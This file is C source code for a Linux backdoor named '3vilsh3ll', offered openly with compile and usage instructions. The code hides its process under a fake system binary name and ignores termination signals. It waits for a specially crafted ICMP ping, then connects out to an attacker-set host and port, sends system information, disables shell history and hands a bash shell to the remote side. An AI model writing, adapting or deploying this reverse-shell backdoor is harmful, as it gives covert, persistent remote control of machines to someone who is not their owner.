	/****************************************************************************
	*****************************************************************************

			BACKDOOR REMOTE CONNECT 3vilsh3ll v b1


	AUTHOR 	: Simpp
	WHY 	: Just for fub
	THANK	: x_hunter for english

	Compile	: gcc -o evilshell evilshell.c
	Use	: ./evilshell ( /!\ must be root for SOCK_RAW /!\ )


	LICENCE GNU/GPL


   			 Copyright 2008, Simpp ( null.sim@gmail.com )


   		 This file is part of 3vilsh3ll

		3vilsh3ll is free software; you can redistribute it and/or modify
		it under the terms of the GNU General Public License as published by
  		the Free Software Foundation; either version 2 of the License, or
		(at your option) any later version.

		3vilsh3ll is distributed in the hope that it will be useful,
   		but WITHOUT ANY WARRANTY; without even the implied warranty of
    		MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    		GNU General Public License for more details.

		You should have received a copy of the GNU General Public License
		along with Foobar; if not, write to the Free Software
		Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA


		description :

			the backdoor launch the connection to the pc when it recieve the paquet 
			ICMP ping with the filled fields like this :  
				id 	: 1337
				code 	: 0
				type 	: 8

			backdoor remote connect .
			change the name procecus for hide the command ps .
			ignore signal SIGTERM SIGINT SIGQUIT SIGSTOP for don't stop the backdoor .
			redirect stderr in /dev/null for discret .
			create procecus child for execute the evil code .
			need passwd for connect backdoor .
			redirect bash history (HISTFILE) in /dev/null for the new shell .
			redirect stdout , stdin in socket client .

	

	*****************************************************************************
	****************************************************************************/

#include <errno.h>
#include <stdio.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <linux/ip.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/icmp.h>
#include <sys/utsname.h>

#define HIDDEN		"/usr/sbin/lpinfo"
#define VAR 		"HISTFILE=/dev/null"
#define	IP_DST		"IP_ADDRESS"
#define PORT		8000
#define PACKET_LEN	(sizeof(struct icmphdr) + sizeof(struct iphdr))
#define	ICMP_LEN	sizeof(struct icmphdr)
#define	IP_LEN		sizeof(struct iphdr)

typedef struct icmphdr icmphdr_t;
typedef struct iphdr iphdr_t;
typedef struct socket_server_s socket_server_t;
typedef struct socket_client_s socket_client_t;
typedef struct packet_s packet_t;

struct socket_server_s {
	int socket;
	struct sockaddr_in from;
	socklen_t fromlen;
} ;

struct packet_s {
	icmphdr_t *icmp;
	iphdr_t *ip;
	char *pkt;
} ;

struct socket_client_s {
	int socket;
	struct sockaddr_in to;
} ;


int			configure(char *argv[]);
int			listne_packet(void);
int			init_packet(packet_t **packet);
socket_server_t*	init_server(void);
void			free_packet(packet_t *packet);
void			free_server(socket_server_t *server);
void			start_3vilsh3ll(void);
socket_client_t*	init_client(void);
void			free_client(socket_client_t *client);
int			socket_client_new(socket_client_t *client);
int			socket_client_connect(socket_client_t *client);
int			send_info(int socket);
int			socket_client_connect_dup2(int socket);


int main(int argc, char *argv[])
{
	if ( configure(argv) == -1 )
		printf("crach");

	return EXIT_SUCCESS;
}

int
configure(char *argv[])
{
	pid_t pid;
	int fd = 0;
	int ret1, ret2 = 0;

	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv[0], HIDDEN);

	signal(SIGQUIT, SIG_IGN);
	signal(SIGTERM, SIG_IGN);
	signal(SIGINT, SIG_IGN);
	signal(SIGSTOP, SIG_IGN);

	fd = open("/dev/null", O_WRONLY);
	if ( fd == -1 )
		return -1;

	close(3);
	close(4);
	ret1 = dup2(fd, 3);
	ret2 = dup2(fd, 4);
	close(fd);
	if ( ret1 != -1 && ret2 != -1 )
		return -1;


	pid = fork();
	if ( pid == -1 )
		return -1;
	else if ( pid )
		exit(0);
	else {
		if ( listen_packet() == -1 )
			return -1;
	}

	return 0;
}

int
listen_packet(void)
{
	packet_t *packet = NULL;
	socket_server_t *server = NULL;
	int ret = 0;

	if ( init_packet(&packet) == -1 ) {
		free_packet(packet);
		return -1;
	}
	if ( (server = init_server()) == NULL ) {
		free_packet(packet);
		return -1;
	}

	server->socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if ( server->socket == -1 ) {
		free_packet(packet);
		free_server(server);
		return -1;
	}
	server->fromlen = sizeof(struct sockaddr_in);

	while ( 1 ) {
		ret = recvfrom(server->socket, packet->pkt, PACKET_LEN, 0, 
					(struct sockaddr *)&server->from, &server->fromlen);

		if ( ret != -1 ) {
			packet->ip = (iphdr_t *) packet->pkt;
			packet->icmp = (icmphdr_t *) (packet->pkt + IP_LEN);
			if ( packet->icmp->code == 0 && packet->icmp->type == 8 && packet->icmp->un.echo.id == 1337 )
				start_3vilsh3ll();

			memset(packet->ip, 0x0, IP_LEN);
			memset(packet->icmp, 0x0, ICMP_LEN);
		}
	}

	free_packet(packet);
	free_server(server);
	return 0;
}

int
init_packet(packet_t **packet)
{
	*packet = NULL;

	*packet = malloc(sizeof(packet_t));
	if ( *packet == NULL )
		return -1;

	(*packet)->pkt = NULL;
	(*packet)->ip = NULL;
	(*packet)->icmp = NULL;

	(*packet)->pkt = malloc(PACKET_LEN);
	if ( (*packet)->pkt == NULL )
		return -1;
	memset((*packet)->pkt, 0x0, PACKET_LEN);

	return 0;
}

socket_server_t*
init_server(void)
{
	socket_server_t *server = NULL;

	server = malloc(sizeof(socket_server_t));
	if ( server != NULL )
		server->socket = -1;

	return server;
}

void
free_packet(packet_t *packet)
{
	if ( packet != NULL ) {
		if ( packet->pkt != NULL ) {
			free(packet->pkt);
			packet->pkt = NULL;
		}
		free(packet);
		packet = NULL;
	}
}

void
free_server(socket_server_t *server)
{
	if ( server != NULL ) {
		if ( server->socket != -1 )
			close(server->socket);
		free(server);
		server = NULL;
	}
}

void
start_3vilsh3ll(void)
{
	socket_client_t *client = NULL;

	if ( (client = init_client()) == NULL )
		return;

	if ( socket_client_new(client) == -1 ) {
		free_client(client);
		return;
	}

	if ( socket_client_connect(client) == -1 ) {
		free_client(client);
		return;
	}

	if ( send_info(client->socket) == -1 ) {
		free_client(client);
		return;
	}

	if ( socket_client_connect_dup2(client->socket) == -1 ) {
		free_client(client);
		return;
	}

	if ( putenv(VAR) == -1 ) {
		free_client(client);
		return;
	}
		
	system("/bin/bash");
	free_client(client);
}

socket_client_t*
init_client(void)
{
	socket_client_t *client = NULL;

	client = malloc(sizeof(socket_client_t));
	if ( client != NULL )
		client->socket = -1;

	return client;
}

void
free_client(socket_client_t *client)
{
	if ( client != NULL ) {
		if ( client->socket != -1 )
			close(client->socket);
		free(client);
		client = NULL;
	}
}

int
socket_client_new(socket_client_t *client)
{
	client->socket = socket(AF_INET, SOCK_STREAM, 0);
	if ( client->socket == -1 )
		return -1;

	client->to.sin_family = AF_INET;
	client->to.sin_port = htons(PORT);
	client->to.sin_addr.s_addr = inet_addr(IP_DST);

	return 0;
}

int
socket_client_connect(socket_client_t *client)
{
	int ret;

	ret = connect(client->socket, (struct sockaddr *)&client->to, sizeof(client->to));
	if ( ret == -1 )
		return -1;

	return 0;
}

int
send_info(int socket)
{
	struct utsname *name = NULL;
	int ret;
	char info[450];

	name = malloc(sizeof(struct utsname));
	if ( name == NULL ) {
		free(name);
		return -1;
	}

	ret = uname(name);
	if ( ret == -1 ) {
		free(name);
		return -1;
	}

	snprintf(info, sizeof(info),"\n\t - BY SIMPP BACKDOORED SYSTEM INFO -\n\nNoyau :\r\t\t\t%s\nSystem's name :\r\t\t\t%s\nVersion :\r\t\t\t%s\nProcess :\r\t\t\t%s\nName host:\r\t\t\t%s\ncmd->\n",
		name->release, name->sysname, name->version, name->machine, name->nodename);

	if ( send(socket, info, strlen(info), 0) == -1 ) {
		free(name);
		return -1;
	}

	free(name);
	return 0;
}

int
socket_client_connect_dup2(int socket)
{
	int ret1, ret2;

	close(0);
	close(1);
	ret1 = dup2(socket, 0);
	ret2 = dup2(socket, 1);

	if ( ret1 == -1 || ret2 == -1 )
		return -1;

	return 0;
}
